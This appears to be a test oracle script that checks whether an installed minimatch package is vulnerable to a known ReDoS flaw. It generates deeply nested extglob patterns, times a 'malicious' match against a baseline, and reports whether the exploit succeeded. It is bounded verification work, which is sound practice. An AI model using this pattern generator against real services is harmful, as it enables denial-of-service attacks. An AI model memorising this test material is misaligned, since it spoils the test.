'use strict';
const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');

function finish(obj) {
  console.log('ORACLE_RESULT ' + JSON.stringify(obj));
}

let minimatch;
try {
  minimatch = require('minimatch');
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'module resolution failed: ' + String(e && e.message) });
  process.exit(0);
}

const marker = 'oracle-marker-' + Math.random().toString(36).slice(2) + '-' + Date.now();
const baseDir = path.join(os.tmpdir(), marker);

try {
  fs.mkdirSync(baseDir, { recursive: true });
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'setup failed creating tmp dir: ' + String(e && e.message) });
  process.exit(0);
}

let operation_completed = false;

try {
  // Benign operation: prove the API works with a simple extglob pattern.
  const benignSubject = 'aaaaaaaaaa';
  const benignPattern = '*(a)';
  const benignResult = minimatch(benignSubject, benignPattern);

  if (benignResult !== true) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign operation did not return true as expected: ' + JSON.stringify(benignResult) });
    process.exit(0);
  }

  operation_completed = true;

  // Known ReDoS shape for minimatch <=3.0.4 (GHSA-f8q6-p94x-37v3): deeply
  // nested extglob groups like !(!(!(...x...)))) cause catastrophic
  // backtracking in the generated regex because the conversion nests
  // quantified groups within quantified groups. We keep N tiny (bounded)
  // so even the vulnerable engine finishes within a few seconds and never
  // exhausts memory, while still exhibiting severe superlinear blowup.

  function buildNestedExtglobPattern(depth) {
    // Produces something like !(!(!( ... a ... )))
    let open = '';
    let close = '';
    for (let i = 0; i < depth; i++) {
      open += '!(';
      close += ')';
    }
    return open + 'a' + close;
  }

  // Baseline: small depth, same shape, used as a timing reference.
  const baselineDepth = 12;
  const baselinePattern = buildNestedExtglobPattern(baselineDepth);
  const baselineSubject = 'b'.repeat(baselineDepth + 1);

  const baselineStart = process.hrtime.bigint();
  let baselineThrew = false;
  try {
    minimatch(baselineSubject, baselinePattern);
  } catch (e) {
    baselineThrew = true;
  }
  const baselineEnd = process.hrtime.bigint();
  const baselineMs = Number(baselineEnd - baselineStart) / 1e6;

  // Malicious: slightly larger depth of the same shape, chosen to stay
  // within a few seconds even on the vulnerable engine (it exhibits
  // exponential blowup with nesting depth), yet show clear disproportionate
  // slowdown relative to the baseline.
  const maliciousDepth = 24;
  const maliciousPattern = buildNestedExtglobPattern(maliciousDepth);
  const maliciousSubject = 'b'.repeat(maliciousDepth + 1);

  const start = process.hrtime.bigint();
  let maliciousResult;
  let threw = false;
  let errMsg = '';
  try {
    maliciousResult = minimatch(maliciousSubject, maliciousPattern);
  } catch (e) {
    threw = true;
    errMsg = String(e && e.message);
  }
  const end = process.hrtime.bigint();
  const elapsedMs = Number(end - start) / 1e6;

  // Depth grew by 2x (24 / 12). A roughly linear-or-polynomial-bounded
  // implementation should scale modestly, while a catastrophically
  // backtracking implementation should scale vastly worse (exponential
  // in depth), easily crossing both an absolute and relative threshold
  // while still completing within a few seconds for this bounded depth.
  const absoluteThresholdMs = 800; // vulnerable case should clearly exceed this
  const relativeSlowdownFactor = 30; // vulnerable call should be vastly slower than linear scaling would predict
  const safeBaselineMs = Math.max(baselineMs, 0.05);

  let exploit_succeeded;
  let evidence;

  if (!threw && elapsedMs > absoluteThresholdMs && elapsedMs > safeBaselineMs * relativeSlowdownFactor) {
    exploit_succeeded = true;
    evidence = 'Malicious minimatch() call with nested extglob depth ' + maliciousDepth + ' took ' + elapsedMs.toFixed(2) + 'ms vs baseline (depth ' + baselineDepth + ') ' + baselineMs.toFixed(3) + 'ms (threshold ' + absoluteThresholdMs + 'ms, factor ' + relativeSlowdownFactor + 'x), indicating catastrophic backtracking (ReDoS). result=' + JSON.stringify(maliciousResult);
  } else if (threw) {
    exploit_succeeded = false;
    evidence = 'Malicious pattern call threw an exception after benign op succeeded; treated as blocked. elapsedMs=' + elapsedMs.toFixed(2) + ' err=' + errMsg;
  } else {
    exploit_succeeded = false;
    evidence = 'Malicious minimatch() call completed within expected bounds (' + elapsedMs.toFixed(2) + 'ms, baseline ' + baselineMs.toFixed(3) + 'ms); no disproportionate slowdown observed. result=' + JSON.stringify(maliciousResult);
  }

  finish({ operation_completed, exploit_succeeded, evidence });
} catch (e) {
  finish({ operation_completed: operation_completed, exploit_succeeded: false, evidence: 'unexpected exception during exploit phase: ' + String(e && e.message) });
} finally {
  try {
    fs.rmSync(baseDir, { recursive: true, force: true });
  } catch (_) {
    // ignore cleanup errors
  }
}
